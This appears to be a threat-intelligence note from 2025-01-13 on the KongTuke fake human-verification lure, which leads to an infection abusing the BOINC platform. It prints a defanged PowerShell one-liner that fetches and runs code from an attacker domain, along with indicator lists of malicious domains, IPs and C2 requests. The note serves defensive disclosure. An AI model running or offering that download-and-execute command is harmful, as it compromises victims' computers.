@@ -1,0 +1,44 @@
+2025-01-13 (MONDAY): KONGTUKE LURE LEADS TO INFECTION ABUSING BOINC
+
+AUTHOR:
+
+- Bradley Duncan
+
+NOTES:
+
+- The KongTuke lure consists of injected script that currently causes websites to display fake "verify you are human" pages.
+- These fake verification pages load a potential victim's Windows copy/paste buffer with malicious PowerShell script.
+- The page also gives detailed instructions asking potential victims to paste execute the script in a Run window.
+- This lure is used in campaign frequently tracked as #KongTuke by sources like @monitorsg on Mastodon and ThreatFox:
+  -- https://infosec.exchange/@monitorsg
+  -- https://threatfox.abuse.ch/browse/tag/Kongtuke/
+- The copy/paged PowerShell script leads to an infection abusing BOINC, the Berkeley Open Infrastructure for Network Computing.
+  -- BOINC is a legitimate network computing platform used by various legitimate organizations.
+  -- More information at: https://boinc.berkeley.edu/
+- Two domains in the post-infection traffic, rosettahome[.]cn and rosettahome[.]top, are set up as BOINC project servers.
+  -- Using "rosettahome" as the root domain name might be an attempt to evade detection by seeming like legitimate rosetta@home servers.
+  -- However, these servers are not associated with rosetta@home.
+  -- More info on the real rosetta@home is available at https://boinc.bakerlab.org/rosetta/rah/rah_about.php
+
+TRAFFIC FOR FAKE HUMAN VERIFICATION PAGE:
+
+- hxxps[:]//prpages[.]com/4e2e.js
+- hxxps[:]//prpages[.]com/js.php?device=windows&ip=[base64 text]&refferer=[base64 text]==&browser=[base64 text]&ua=[base64 text]&domain=[base64 text]==&loc=[base64 text]&is_ajax=1
+
+EXAMPLE OF COPY/PASTE SCRIPT FROM FAKE VERIFICATION PAGE:
+
+powershell -WindowStyle Hidden $global:block=curl -useb hxxp[:]//lggknhaffleahbh[.]top/1.php?s=527;iex $global:block.content
+
+EXAMPLE OF INFECTION TRAFFIC WHEN RUNNING COPY/PASTE SCRIPT:
+
+- 45.61.136[.]138 port 80 - lggknhaffleahbh[.]top - GET /1.php?s=527
+- 45.61.136[.]138 port 80 - lggknhaffleahbh[.]top - GET /gqwfk4emolhtr.php?id=DESKTOP-UGY3RNK&key=19733575552&s=527
+- 5.161.229[.]58 port 25658 - adlndb2k9too7vt[.]top - TLSv1.0 traffic
+- port 443 - api.ipify[.]org - IP address check by the infected host, not malicious
+- 64.52.80[.]211 port 80 - 64.52.80[.]211 - GET /1.php?s=boicn
+- 104.238.61[.]8 port 80 - rosettahome[.]top - GET /rosettahome/
+- port 443 - boinc.berkeley[.]edu - HTTPS traffic for BOINC, not malicious
+- 104.238.61[.]8 port 80 - rosettahome[.]top - POST /rosettahome_cgi/cgi
+- 104.238.61[.]8 port 80 - rosettahome[.]cn - GET /rosettahome/notices.php?userid=1&auth=1_1a362b2ad50985e203845fe44682096e
+- 104.238.61[.]8 port 80 - rosettahome[.]cn - GET /rosettahome/ HTTP/1.1 
+- 104.238.61[.]8 port 80 - rosettahome[.]top - POST /rosettahome_cgi/cgi <-- repeats approximately every 5 minutes
